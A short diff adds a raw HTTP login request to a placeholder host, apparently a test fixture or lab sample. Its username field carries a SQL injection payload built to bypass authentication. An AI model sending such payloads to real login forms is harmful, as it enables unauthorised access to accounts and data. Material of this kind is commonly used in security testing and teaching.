@@ -1,0 +1,5 @@
+POST /login HTTP/1.1
+Host: vuln.example.com
+Content-Type: application/x-www-form-urlencoded
+
+user=admin' OR 1=1--&pass=x
